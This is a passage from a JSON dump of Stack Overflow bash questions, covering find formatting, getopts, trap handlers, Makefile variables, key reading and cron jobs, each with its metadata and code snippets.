to</p>\n\n<pre><code>C:\\cygwin\\bin\\mintty.exe -i /Cygwin-Terminal.ico -\n</code></pre>\n\n<p>The relevant part of the autohotkey script is the following</p>\n\n<pre><code>#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.\nSendMode Input  ; Recommended for new scripts due to its superior speed and reliability.\nSetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.\n...\n::avra'::avrà\n::avro'::avrò\n...\n</code></pre>\n"},{"tags":["bash","find"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":13227072,"title":"bash find format new line","body":"<p>I running a find command which output is similar to a ls -l, I need to insert a new line but it's not working</p>\n\n<pre><code>find $dir_name -size $sizeFile -printf '%M %n %u %g %s %Tb %Td %Tk:%TM %p\\n'\n</code></pre>\n\n<p>the output that I'm getting is like this:</p>\n\n<pre><code>-rwx------ 1 juanpa juanpa 26615 Nov 04 20:47 ./sample.dir1/vimtutor -rwx------ 1 juanpa juanpa 25557 Nov 04 20:47 ./sample.dir1/cdlist -rwx------ 1 juanpa juanpa 135838 Nov 04 20:47 ./sample.dir1/.phones -rwx------ 1 juanpa juanpa 26615 Nov 04 20:47 ./sample.dir1/testdir1/vimtutor -rwx------ 1 juanpa juanpa 26615 Nov 04 20:47 ./sample.dir1/testdir1/subdir1/vimtutor -rwx------ 1 juanpa juanpa 135838 Nov 04 20:47 ./sample.dir1/testdir1/subdir1/phones -rwx------ 1 juanpa juanpa 25557 Nov 04 20:47 ./sample.dir1/testdir1/subdir1/cdlist -rwx------ 1 juanpa juanpa 20558 Nov 04 20:47 ./sample.dir1/testdir1/subdir1/sample.txt -rwx------ 1 juanpa juanpa 135838 Nov 04 20:47 ./sample.dir1/testdir1/phones -rwx------ 1 juanpa juanpa 25557 Nov 04 20:47 ./sample.dir1/testdir1/cdlist -rwx------ 1 juanpa juanpa 20558 Nov 04 20:47 ./sample.dir1/testdir1/sample.txt -rwx------ 1 juanpa juanpa 20558 Nov 04 20:47 ./sample.dir1/sample.txt -rwx------ 1 juanpa juanpa 26615 Nov 04 20:47 ./sample.dir2/vimtutor -rwx------ 1 juanpa juanpa 25557 Nov 04 20:47 ./sample.dir2/cdlist -rwx------ 1 juanpa juanpa 26615 Nov 04 20:47 ./sample.dir2/testdir2/vimtutor -rwx------ 1 juanpa juanpa 135838 Nov 04 20:47 ./sample.dir2/testdir2/phones -rwx------ 1 juanpa juanpa 25557 Nov 04 20:47 ./sample.dir2/testdir2/cdlist -rwx------ 1 juanpa juanpa 26615 Nov 04 20:47 ./sample.dir2/testdir2/subdir2/vimtutor -rwx------ 1 juanpa juanpa 135838 Nov 04 20:47 ./sample.dir2/testdir2/subdir2/phones -rwx------ 1 juanpa juanpa 25557 Nov 04 20:47 ./sample.dir2/testdir2/subdir2/cdlist -rwx------ 1 juanpa juanpa 20558 Nov 04 20:47 ./sample.dir2/testdir2/subdir2/sample.txt -rwx------ 1 juanpa juanpa 20558 Nov 04 20:47 ./sample.dir2/testdir2/sample.txt -rwx------ 1 juanpa juanpa 20558 Nov 04 20:47 ./sample.dir2/sample.txt\n</code></pre>\n\n<p>does any one know what I'm missing or doing wrong???</p>\n\n<p>thanks in advace for any help</p>\n"},{"tags":["linux","bash","shell","script"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13225053,"title":"Shell Script mkdir if not and mv files to each day","body":"<p>I need to check in a dir that have 150.000 zip files with this kind of format :</p>\n\n<pre><code>log_from_2012_08_14-11:57:12_To_2012_08_14-13:57:12.zip\nlog_from_2012_08_14-13:57:12_To_2012_08_14-15:57:12.zip\nlog_from_2012_08_14-15:57:12_To_2012_08_14-17:57:12.zip\n</code></pre>\n\n<p>if there is a dir with the name equals to the day of the file :</p>\n\n<pre><code>2012_08_14 \n</code></pre>\n\n<p>then move all files that exist from that From_2012_08_14 to that dir, if not create it </p>\n\n<blockquote>\n  <p>( mkdir date +%Y_%M_%D )</p>\n</blockquote>\n\n<p>and then check for each day since august until today november , every file from a day that doenst have is own dir create it and move it there. </p>\n"},{"tags":["bash","unix"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":51,"score":3,"question_id":13225488,"title":"Bash, run script on every .jpg file in a directory with subdirectories","body":"<p>I have some working code, it's very simple - it copies every *.jpg file, renames it into *1.jpg, no worries.</p>\n\n<pre><code>for i in *.jpg; do cp $i ${i%%.jpg}1.jpg;  done\n</code></pre>\n\n<p>how can I run this, so that it works on every file in a directory, every file in the subdirectories of that directory</p>\n\n<p>example directory structure: </p>\n\n<pre><code>    test/test1/test2/somefile.jpg\n    test/anotherfile.jpg\n    test/test1/file.jpg\netc\n</code></pre>\n"},{"tags":["c","linux","bash","expect","rm"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":13223369,"title":"system command rm not working in expect program","body":"<p>I have a code (1) that is supposed to execute test in another code (its a pseudo-bash). This code (1) is wrote using the \"expect\" for the 'user simulation'.</p>\n\n<p>The problem is when this code (1) execute a system ( on this case, system \"rm totoExpect.txt titiExpect.txt\") when its just doesnt find the titiExpected.txt, but is there!</p>\n\n<p>There is nothing different between the two files, even the permissions are the same, i cant think in a reason that doesnt work.</p>\n\n<p>Here is the part of the code (1) where the problem raises:</p>\n\n<pre><code># test 5\nproc t5 {} {\n    send \"ls &gt; totoExpect.txt\\r\"\n    send \"cat &lt; totoExpect.txt | wc -l &gt; titiExpect.txt\\r\"\n    send \"cat titiExpect.txt\\r\"\n    expect -re \"(0|1|2|3|4|5|6|7|8|9)+.*&gt;\" { ok 5; } default { abort 5 }\n    system \"rm totoExpect.txt titiExpect.txt\"\n}\n</code></pre>\n\n<p>And the Error message:</p>\n\n<pre><code>ls &gt; totoExpect.txt\nout: totoExpect.txt\nseq[0]: 'ls' \n-----3\nensishell&gt;c\n ***** TEST 5 ok\n\nrm: não foi possível remover \"titiExpect.txt\": Arquivo ou diretório não encontrado\nchild process exited abnormally\n    while executing\n\"system \"rm totoExpect.txt titiExpect.txt\"\"\n    (procedure \"t5\" line 6)\n    invoked from within\n\"t5\"\n    (\"eval\" body line 1)\n    invoked from within\n\"eval \"t$t;\" \"\n    (\"foreach\" body line 1)\n    invoked from within\n\"foreach t {0 1 2 3 4 5 6 7} { eval \"t$t;\" } \"\n    invoked from within\n\"expect_user {\n    -timeout 30 \"auto\\n\" {\n    puts \"AUTO:\\n\";\n    foreach t {0 1 2 3 4 5 6 7} { eval \"t$t;\" } \n    }\n    -timeout 30 -re \"(\\[0123456789 \\]+)\\...\"\n    (file \"./testshell.expect\" line 99)\nmake: ** [test] Erro 1\n</code></pre>\n\n<p>Where \"rm: não foi possível remover \"titiExpect.txt\": Arquivo ou diretório não encontrado\" \nmeans \"rm: it was not possible to remove \"titiExpect.txt\": file or directory not found\" (sorry about that...)</p>\n\n<p>and this is the ls -l just after the error message (so titiExpect.txt shouldnt be there):</p>\n\n<pre><code>-rwxrwxr-x   1 fernando       fernando    273 Out 23 17:53 #Makefile#\n-rwxrwxr-x   1 fernando       fernando   6238 Nov  5 21:18 #ensishell.c#\n-rwxrwxr-x   1 fernando       fernando   1271 Out 24 20:30 #readcmd.h#\n-rwxrwxr-x   1 fernando       fernando   3250 Nov  5 21:07 #testshell.expect#\n-rwxrwxrwx   1 fernando       fernando    303 Out 24 20:21 Makefile\ndrwxrwxr-x   2 fernando       fernando   4096 Nov  4 19:06 SEPC shell\n-rw-rw-r--   1 fernando       fernando 193453 Out 18 18:25 Sujet_shell.pdf\n-rwxrwxr-x   1 fernando       fernando  25451 Nov  5 21:17 ensishell\n-rwxrwxrwx   1 fernando       fernando   6238 Nov  5 20:32 ensishell.c\n-rw-rw-r--   1 fernando       fernando  10664 Nov  5 21:17 ensishell.o\n-rwxrwxr-x   1 fernando       fernando   7251 Nov  4 00:33 foo\n-rw-rw-r--   1 fernando       fernando    173 Nov  4 00:33 foo.c\n-rw-rw-r--   1 fernando       fernando     16 Nov  4 01:15 in.txt~\n-rwxrwxrwx   1 fernando       fernando   6603 Out 23 00:37 readcmd.c\n-rwxrwxrwx   1 fernando       fernando   1271 Out 23 01:24 readcmd.h\n-rwxrwxrwx   1 fernando       fernando   1271 Out 23 00:37 readcmd.h~\n-rw-rw-r--   1 fernando       fernando  11216 Nov  5 21:17 readcmd.o\n-rwxrwxrwx   1 fernando       fernando   3250 Nov  5 20:41 testshell.expect\n-rwx------   1 fernando       fernando   1263 Nov  5 12:43 toto.txt\n</code></pre>\n\n<p>The worst problem is this code is not supposed to be modified, but its seems to me that is the programs fault this fail. (in fact, commenting the line solve the problem..)</p>\n\n<p>Any ideas?</p>\n"},{"tags":["bash","scripting","environment","ubuntu-12.04","kubuntu"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":57,"score":2,"question_id":13224804,"title":"tab-expansion and \"./\" bash shell","body":"<p>Maybe someone here would be able to help me out. Have installed Ubuntu 12.04 LTS (kubuntu) on two machines. The <code>.bashrc</code> and <code>.bash_profile</code> files are identical as the file structures on each machine is the same. </p>\n\n<p><strong>On machine 1</strong>: I run bash scripts within a terminal window with the simple: <code>./scriptname.sh</code>  </p>\n\n<p><strong>On machine 2</strong>: I cannot do this and must use: <code>sh scriptname.sh</code>\nNor can I use <code>./</code> and tab-complete the script filename.</p>\n\n<p>All executable bits are set correctly, all files and folders have the correct permissions. In the header of the scripts the shebang is set correctly. </p>\n\n<p>Any ideas why this would be occurring? </p>\n\n<p>If I try to execute the script with <code>./file_motion_grab.sh</code>:</p>\n\n<pre><code>bash: ./file_motion_grab.sh: Permission denied\n</code></pre>\n\n<p>When I try <code>ls -l</code>, I get:</p>\n\n<pre><code>-rwxrwxrwx 1 adelie adelie 351 Nov 4 20:32 file_motion_grab.sh\n</code></pre>\n\n<p>Output of <code>getfacl</code> is:</p>\n\n<pre><code># file: file_motion_grab.sh\n# owner: adelie\n# group: adelie\nuser::rwx\ngroup::rwx\nother::rwx\n</code></pre>\n\n<p>More general - any new script on the second machine must be invoked with: sh scriptname.sh Something probably wrong in the .bash files. But not sure where to look.</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":30,"score":-2,"question_id":13224142,"title":"How to set read for different characters in bash-shell?","body":"<p>How to set read for different characters?  Does anyone know a solution?</p>\n\n<pre><code>while true\ndo\n    read -sn3 KEY\n\n        case \"$KEY\" in\n             $'\\x1b[A') echo \"press arrow up\";;   # OK\n             $'\\x1b[B') echo \"press arrow down\";; # OK\n             $'\\x1b[15~') echo \"press key F5\";;   # Problem !!!\n        esac\ndone\n</code></pre>\n\n<p>Thank you</p>\n"},{"tags":["linux","bash"],"answer_count":13,"favorite_count":18,"up_vote_count":42,"down_vote_count":0,"view_count":40201,"score":42,"question_id":192292,"title":"Bash: How _best_ to include other scripts?","body":"<p>The way you would normally include a script is with \"source\"</p>\n\n<p>eg:</p>\n\n<p>main.sh:</p>\n\n<pre><code>#!/bin/bash\n\nsource incl.sh\n\necho \"The main script\"\n</code></pre>\n\n<p>incl.sh:</p>\n\n<pre><code>echo \"The included script\"\n</code></pre>\n\n<p>The output of executing \"./main.sh\" is:</p>\n\n<pre><code>The included script\nThe main script\n</code></pre>\n\n<p>... Now, if you attempt to execute that shell script from another location, it can't find the include unless it's in your path.</p>\n\n<p>What's a good way to ensure that your script can find the include script, especially if for instance, the script needs to be portable?</p>\n"},{"tags":["linux","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":25,"score":2,"question_id":13223020,"title":"bash using getopts","body":"<p>Example of script usage</p>\n\n<pre><code>./foo.sh -v -r /home/ -s /home/user/file\n./foo.sh -r /home/ -s /home/user/file\n</code></pre>\n\n<p>In parameter I always need a file or a folder to scan and a file for the database (-s database file)</p>\n\n<p>inside foo.sh</p>\n\n<pre><code>function entrance()\n{\nwhile getopts \"v:r:s\" opt; do\n  case $opt in\n    v)\n      echo \"-v was triggered, Verbose mode\" &gt;&amp;2\n      ;;\n    r)\n      echo \"-r was triggered, recursive mode: $OPTARG\" &gt;&amp;2\n      ;;\n    s)\n      echo \"-s was triggered, DATABASE: $OPTARG\" &gt;&amp;2\n      ;;\n    \\?)\n      echo \"Invalid option: -$OPTARG\" &gt;&amp;2\n      exit 1\n      ;;\n    :)\n      echo \"Option -$OPTARG requires an argument.\" &gt;&amp;2\n      exit 1\n      ;;\n  esac\ndone\n}\n</code></pre>\n\n<p>I don't know why it doesn't work.</p>\n\n<p>Please fix me.</p>\n\n<p>Thanks</p>\n"},{"tags":["bash","debugging","trap"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":10,"score":1,"question_id":13223279,"title":"how can a sourced file inherit trap DEBUG?","body":"<p>Please consider the following code:</p>\n\n<pre><code>#!/bin/bash\n\nfunction preexec ()\n{\n    echo - e \"\\n--&gt;preexec\"\n}\ntrap 'preexec' DEBUG\n\nfunction testfunc ()\n{\n    echo \"testfunc called\"\n}\n\necho \"before main testfunc\"\ntestfunc \n</code></pre>\n\n<hr>\n\n<p>The output is:</p>\n\n<pre><code>--&gt;preexec\nbefore main testfunc\n\n--&gt;preexec\ntestfunc called\n</code></pre>\n\n<hr>\n\n<p>The function preexec is correctly executed before any command.\n<br>\n<br>\nNow If I source source.sh</p>\n\n<pre><code>#!/bin/bash\n\necho \"sourced file\"\ntestfunc\n</code></pre>\n\n<p>like this:</p>\n\n<pre><code>#!/bin/bash\n\nfunction preexec ()\n{\n    echo -e \"\\n--&gt;preexec\"\n}\ntrap 'preexec' DEBUG\n\nfunction testfunc ()\n{\n    echo \"testfunc called\"\n}\n\necho \"before main testfunc\"\ntestfunc \nsource \"source.sh\"\n</code></pre>\n\n<hr>\n\n<p>The output is:</p>\n\n<pre><code>--&gt;preexec\nbefore main testfunc\n\n--&gt;preexec\ntestfunc called\n\n--&gt;preexec\nsourced file\ntestfunc called\n</code></pre>\n\n<hr>\n\n<p>The command 'source' executes preexec while none of the commands inside the sourced file does the same.<br>\n<br>\nBut, if I modify the script.sh like this</p>\n\n<pre><code>#!/bin/bash\n\ntrap 'preexec' DEBUG\necho \"sourced file\"\ntestfunc\n</code></pre>\n\n<hr>\n\n<p>Then the output is: (firing the main.sh script)</p>\n\n<pre><code>--&gt;preexec\nbefore main testfunc\n\n--&gt;preexec\ntestfunc called\n\n--&gt;preexec\n\n--&gt;preexec\nsourced file\n\n--&gt;preexec\ntestfunc called\n</code></pre>\n\n<hr>\n\n<p>Now every sourced command executes preexec, too.<br>\n<br>\n<strong>Is there any chance to tell the sourced file to inherit this trap without having to add it to the sourced script itself?</strong></p>\n"},{"tags":["bash","sed"],"answer_count":6,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":70,"score":3,"question_id":13216686,"title":"Remove spaces between patterns","body":"<p>I have a log file where data is separated by spaces. Unfortunately one of the datafields contains spaces as well. I would like to replace those spaces with \"%20\". It looks like this:</p>\n\n<pre><code>2012-11-02 23:48:36 INFO 10.2.3.23 something strange name.doc 3.0.0 view1 orientation_right\n</code></pre>\n\n<p>the expected result is</p>\n\n<pre><code>2012-11-02 23:48:36 INFO 10.2.3.23 something%20strange%20name.doc 3.0.0 view1 orientation_right\n</code></pre>\n\n<p>unpredictable that how many spaces we have between the IP address and \".doc\". So I would like to change them between these two patterns using pure bash if possible.</p>\n\n<p>thanks for the help </p>\n"},{"tags":["bash","unix","shell"],"answer_count":8,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":4576,"score":4,"question_id":81520,"title":"How to suppress Terminated message after killing in bash?","body":"<p>How can you suppress the 'Terminated' message that comes up after you kill a process in a bash script?</p>\n\n<p>I tried set +bm, but that doesn't work.</p>\n\n<p>I know another solution involves calling 'exec 2> /dev/null', but is that reliable? How do I reset it back so that I can continue to see stderr?</p>\n\n<p>Thanks</p>\n"},{"tags":["git","bash","shell"],"answer_count":5,"favorite_count":19,"up_vote_count":37,"down_vote_count":0,"view_count":10955,"score":37,"question_id":3258243,"title":"git: check if pull needed","body":"<p>How to check whether the remote repo has changed and I need to pull?</p>\n\n<p>Now I use this simple script:</p>\n\n<pre><code>git pull --dry-run | grep -q -v 'Already up-to-date.' &amp;&amp; changed=1\n</code></pre>\n\n<p>but it is rather heavy.</p>\n\n<p>Do you know any better way? The ideal solution would check all the remote branches, and return names of the changed branches and the number of new commits in each one.</p>\n"},{"tags":["bash","makefile","make"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":25,"score":2,"question_id":13222718,"title":"Makefile - how to differentiate between a variable assignment and a command","body":"<p>I have the following code in my Makefile, but I get the error mentioning that <code>O?=2</code> is not a command that <code>sh -c</code> can run. What am I doing wrong here?</p>\n\n<pre><code>gcc:\n    O?=2\n    @if test -z \"$(DEBUG)\" ; then \\\n      g++ -O${O} *.c -o palindrome ; \\\n    fi\n</code></pre>\n\n<p>I am trying to set <code>O</code> to <code>2</code> if the user did not provide it, and then build my palindrome executable.</p>\n\n<hr>\n\n<p>Exact error:</p>\n\n<pre><code>$ make gcc\nO?=2\n/bin/sh: O?=2: command not found\nmake: *** [gcc] Error 127\n$\n</code></pre>\n"},{"tags":["arrays","bash","index","key"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13219634,"title":"Easiest way to check for an index or a key in an array?","body":"<p>Using:</p>\n\n<pre><code>set -o nounset\n</code></pre>\n\n<p>1) Having an indexed array like:</p>\n\n<pre><code>myArray=( \"red\" \"black\" \"blue\" )\n</code></pre>\n\n<p>Which is the shortest way to check if element 1 is set?<br>\nI sometimes use the following:</p>\n\n<pre><code>test \"${#myArray[@]}\" -gt \"1\" &amp;&amp; echo \"1 exists\" || echo \"1 doesn't exist\"\n</code></pre>\n\n<p>I would like to know if there's a preferred one.\n<br>\n<br>\n2) How to deal with non-consecutive indexes?</p>\n\n<pre><code>myArray=()\nmyArray[12]=\"red\"\nmyArray[51]=\"black\"\nmyArray[129]=\"blue\"\n</code></pre>\n\n<p>How to quick check that '51' is already set for example?\n<br>\n<br>\n3) How to deal with associative arrays?</p>\n\n<pre><code>declare -A myArray\nmyArray[\"key1\"]=\"red\"\nmyArray[\"key2\"]=\"black\"\nmyArray[\"key3\"]=\"blue\"\n</code></pre>\n\n<p>How to quick check that 'key2' is already used for example?\n<br>\n<br>\nThanks</p>\n\n<p><strong>EDITED</strong><br>\nThe simplest way seems to me:</p>\n\n<pre><code>if test \"${myArray['key_or_index']+isset}\"\n    then\n        echo \"yes\"\n    else\n        echo \"no\"\nfi;\n</code></pre>\n\n<p>This works for both indexed and associative arrays. No errors shown with set -o nounset.<br>\nThanks to doubleDown for the headup.</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13221578,"title":"How to retrieve f5 in bash","body":"<p>Anyone advise how to fix this code? Problem with F5 in read. Please help..</p>\n\n<pre><code>read -sn3 KEY\n\ncase \"$KEY\" in\n     $'\\x1b[A') echo \"press arrow up\";;\n     $'\\x1b[B') echo \"press arrow down\";;\n     $'???') echo \"press key F5\";;\nesac\n</code></pre>\n\n<p>Thank you all for your help</p>\n"},{"tags":["linux","bash"],"answer_count":11,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":4409,"score":5,"question_id":2925606,"title":"How to create a CPU spike with a bash command","body":"<p>I want to create a near 100% load on a Linux machine.  It's quad core system and I want all cores going full speed.  Ideally, the CPU load would last a designated amount of time and then stop.  I'm hoping there's some trick in bash.  I'm thinking some sort of infinite loop. </p>\n"},{"tags":["bash","find","exec"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":55,"score":0,"question_id":13219156,"title":"Passing result of find to custom functions","body":"<p>I write a bash script:</p>\n\n<pre><code>   #!/bin/bash\n    function test_echo\n    {\n        echo $0\n        echo $1\n        echo $2\n        echo $#\n    }\n    test_echo\n</code></pre>\n\n<p>I try:</p>\n\n<pre><code>find test.sh -type f -exec test_echo '{}' \\;\n</code></pre>\n\n<p>or</p>\n\n<pre><code>find . -type f -exec `./test.sh {}` \\;\n</code></pre>\n\n<p>but it doesn't work.</p>\n\n<p>I need a way to scan file from a folder (I use find) and for each file call a function ( foo_fonction() ) with in parameter the full path of the file.</p>\n\n<pre><code> find . -type f -exec foo_fonction '{}' \\; \n</code></pre>\n\n<p>And how to have the parameter (full path) in the foo_fonction() ?</p>\n"},{"tags":["php","bash","script","cli","args"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13219831,"title":"bash script that calls php script with cli args","body":"<p>I need to write a bash script that wraps a php script,\nI have some variables that needs to be forwarded to the php script and some variables that I need internally for the bash script it self.</p>\n\n<p>The call for the shell script should look like that but the php file can have more params so it needs to be generic : </p>\n\n<pre><code>bash  /tmp/test.sh -c -l /tmp/aaa -php aaa.php -d -p 3 -f 2012-10-23\n</code></pre>\n\n<p>the <code>-php</code> option is mandatory because it contains the php file that needs to be called the <code>-c</code> and <code>-l</code> are optional flag and needs to be used internally for the bash script, everything after the <code>aaa.php</code> are params for the php file.</p>\n"},{"tags":["bash","grep","cut"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13212569,"title":"Bash Using Quotes in Grep/Cut Commands in Scripts","body":"<p>I have a line similar to this</p>\n\n<pre><code>grep -oP \"data-context-item-title=.*.data-context-item-id\" web.html | cut -d'\"' -f2\n</code></pre>\n\n<p>I know this line correctly works since I used it on the terminal and it gave me the desired output. However, I want to put this line in a bash script. so I have this so far</p>\n\n<pre><code>title=\"$(grep -oP 'data-context-item-title=.*.data-context-item-id' web.html | cut -d'\"' -f2)\"\n</code></pre>\n\n<p>This is a problem because it matched the first \"(quotation) with the cut's \"(quotation). Is there anyway to avoid it? </p>\n\n<p>Output without the cut function is something similar to this</p>\n\n<pre><code>data-context-item-title=\"Some long title\" data-context-item-id\ndata-context-item-title=\"Another very long title\" data-context-item-id\n</code></pre>\n\n<p>Keep in mind, I can't use any sed or awk commands to replace cut. </p>\n\n<p>Thanks</p>\n"},{"tags":["bash","documentation","overloading","verbosity"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":184,"score":2,"question_id":8371542,"title":"bash: override echo to print a custom prefix in a script","body":"<p>I have some lengthy scripts calling each other and I want their output to be more descriptive. The idea is to customize the echo command for each script with something like below.</p>\n\n<p>My question is, how to make it non recursive, using <code>echo</code>? </p>\n\n<p>this is script1.sh</p>\n\n<pre><code>#!/bin/bash\n#Original version:\n#function echo(){ echo $(basename $0 .sh): $1; }\n#Version after fixes\nfunction echo(){ builtin echo -n \"$(basename $0 .sh): \"&gt;&amp;2; builtin echo $@ ; } \necho Info\n./script2.sh\n</code></pre>\n\n<p>this is script2.sh</p>\n\n<pre><code>#!/bin/bash\n#Original version:\n#function echo(){ echo $(basename $0 .sh): $1; }\n#Version after fixes\nfunction echo(){ builtin echo -n \"$(basename $0 .sh): \"&gt;&amp;2; builtin echo $@ ; } \necho Info\nexit 0\n</code></pre>\n\n<p>so the output should be:</p>\n\n<pre><code>&gt;./script1.sh\nscript1: Info\nscript2: Info\n</code></pre>\n\n<p>--- EDIT</p>\n\n<p>Bonus:</p>\n\n<pre><code>&gt;./script1.sh 2&gt; /dev/null \nInfo\nInfo\n</code></pre>\n"},{"tags":["bash","sorting","sed","rating"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":13210326,"title":"how to sort the file on the five fields with a certain relationship between them?","body":"<p>There is a file as follows:</p>\n\n<pre><code>&lt;timer begin=\"0000000005\" end=\"0000000006\" ref=\"1\" name=\"A\" rating=\"5.10\"&gt;\n&lt;timer begin=\"0000000004\" end=\"0000000008\" ref=\"2\" name=\"C\" rating=\"10.00\"&gt;\n&lt;timer begin=\"0000000002\" end=\"0000000006\" ref=\"2\" name=\"C\" rating=\"10.00\"&gt;\n&lt;timer begin=\"0000000003\" end=\"0000000005\" ref=\"2\" name=\"B\" rating=\"8.50\"&gt;\n&lt;timer begin=\"0000000002\" end=\"0000000003\" ref=\"1\" name=\"D\" rating=\"7.40\"&gt;\n&lt;timer begin=\"0000000001\" end=\"0000000003\" ref=\"2\" name=\"B\" rating=\"8.50\"&gt;\n&lt;timer begin=\"0000000001\" end=\"0000000002\" ref=\"1\" name=\"A\" rating=\"5.10\"&gt;\n&lt;timer begin=\"0000000000\" end=\"0000000001\" ref=\"1\" name=\"D\" rating=\"7.40\"&gt;\n</code></pre>\n\n<p>Where:</p>\n\n<ul>\n<li>'begin' field is the start time of program; </li>\n<li>'end' field is time of the end of program; </li>\n<li>'ref' field is symbolic field which is used in paragraph 3 of the rules, see below </li>\n<li>'name' field is the name of the program</li>\n<li>'rating' field is the weight of the program.</li>\n</ul>\n\n<p>Need to sort the file in the following manner:</p>\n\n<ol>\n<li>Remain in the list of programs to the maximum rating, the rating of\nthe program with less removed; </li>\n<li>End time of each follow-up program should be less than or equal to the time of the next program; </li>\n<li>If the fields are the same 'ref', then consider the second point is not to;</li>\n<li>In this case, the names of the programs should not be repeated.</li>\n</ol>\n\n<p>In other words, the output should be obtained like this one (the following file is sorted by start time):</p>\n\n<pre><code>&lt;timer begin=\"0000000000\" end=\"0000000001\" ref=\"1\" name=\"D\" rating=\"7.40\"&gt;\n&lt;timer begin=\"0000000001\" end=\"0000000003\" ref=\"2\" name=\"B\" rating=\"8.50\"&gt;\n&lt;timer begin=\"0000000002\" end=\"0000000006\" ref=\"2\" name=\"C\" rating=\"10.00\"&gt;\n</code></pre>\n"},{"tags":["bash","trap"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":30,"score":2,"question_id":13213254,"title":"how to get the original caller lineno when executing a function returning a non-zero value","body":"<p>I've made a func.sh script to be sourced containing:</p>\n\n<pre><code>1. function testfunc ()\n2. {\n3.   echo \"--&gt; TESTFUNC CALLED\"\n4.   caller 0\n5.\n6.   # here I mimic that something went wrong\n7.   echo \"now I return a non-zero value\"\n8.   return 1\n9. }\n</code></pre>\n\n<p>Then I've made a main.sh script<br></p>\n\n<pre><code>1. #!/bin/bash\n2.\n3. source 'func.sh'\n4. testfunc\n5.\n6. exit 0\n</code></pre>\n\n<p><strong>My goal is to catch lineno 4</strong> (in the above script), where I haven't managed correctly the returning value.<br>\n<br>\nTo do that I tried:</p>\n\n<pre><code> 1. #!/bin/bash\n 2.\n 3. set -o errexit\n 4.\n 5. function exit_handler ()\n 6. {\n 7.     echo \"--&gt; EXIT HANDLER\"\n 8. \n 9.     echo \"BACKTRACE IS:\"\n10.     local i=0\n11.     while caller $i &gt; /dev/null\n12.         do\n13.             caller $i\n14.             let \"i=i+1\"\n15.     done\n16.\n17.     echo \"PASSED LINENO IS: $1\"\n18.     exit 0\n19. }\n20. trap 'exit_handler $LINENO' EXIT \n21.\n22. source 'func.sh'\n23. testfunc\n24.\n25. exit 0\n</code></pre>\n\n<p>Here I would like to catch the <strong>lineno 23</strong>.<br>\nThe output is:</p>\n\n<pre><code>--&gt; TESTFUNC CALLED\n23 main import.sh\nnow I return a non-zero value\n--&gt; EXIT HANDLER\nBACKTRACE IS:\n1 main.sh\nPASSED LINENO IS: 1\n</code></pre>\n\n<p>The correct lineno is detected by caller inside the function itself, but not in the trap, where the name of the script is correct (main.sh) but not the lineno (1???? instead of 22)\n<br>\n<br>\nI also tried </p>\n\n<pre><code> 1. #!/bin/bash\n 2.\n 3. function err_handler ()\n 4. {\n 5.     echo \"--&gt; ERR HANDLER\"\n 6. \n 7.     echo \"BACKTRACE IS:\"\n 8.     local i=0\n 9.     while caller $i &gt; /dev/null\n10.         do\n11.             caller $i\n12.             let \"i=i+1\"\n13.     done\n14.    \n15.     echo \"PASSED LINENO IS: $1\"\n16.     exit 0\n17. }\n18. trap 'err_handler $LINENO' ERR \n19.\n20. source 'func.sh'\n21. testfunc\n22.\n23. exit 0\n</code></pre>\n\n<p>but the output is:</p>\n\n<pre><code>--&gt; TESTFUNC CALLED\n21 main import.sh\nnow I return a non-zero value\n--&gt; ERR HANDLER\nBACKTRACE IS:\n8 main.sh\nPASSED LINENO IS: 8\n</code></pre>\n\n<p>The caller inside the function itself is still detecting the right <strong>lineno (21</strong> in this case), but the situation inside the trap is even worst because it's getting the lineno 8 which is the line inside func.sh where there's the return 1 ... (while the caller inside the trap refers the line to the wrong script main.sh).\n<br>\n<br>\nAt this point I ran out of ideas... </p>\n"},{"tags":["bash","text","cron","crontab"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13214745,"title":"Bash Script with Crontab","body":"<p>I'm trying to setup a crontab I have this in my current job in the current user I'm logged into</p>\n\n<pre><code>* * * * * /CS/day/get_info.sh\n</code></pre>\n\n<p>get_info.sh is supposed to output a text file every minute and I suspected that it would output a file in the same directory as the script is located but it doesn't. </p>\n\n<p>I've also checked the syslogs to see if I could figure this out.</p>\n\n<pre><code>(user) CMD (/CS/day/get_info.sh)\n(user) MAIL (mailed 46 bytes of output but got status  0x0001#012)\n</code></pre>\n\n<p>Can someone explain to me why this is happening?</p>\n\n<p>Thanks</p>\n"},{"tags":["linux","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13215003,"title":"Are compound command's second and subsequent lines not effected by HISTCONTROL in bash?","body":"<p>When consulting bash's man page, it read this sentence about bash 